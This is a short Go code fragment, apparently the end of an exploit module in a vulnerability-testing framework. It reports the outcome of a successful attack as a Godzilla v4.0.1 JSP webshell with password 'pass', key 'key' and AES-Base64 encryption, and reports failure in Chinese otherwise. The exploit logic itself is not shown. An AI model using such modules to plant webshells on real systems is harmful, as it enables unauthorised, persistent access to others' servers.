					expResult.Output += "Password: pass 密钥：key 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
				}
				expResult.Output += "Webshell type: JSP"
			} else if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
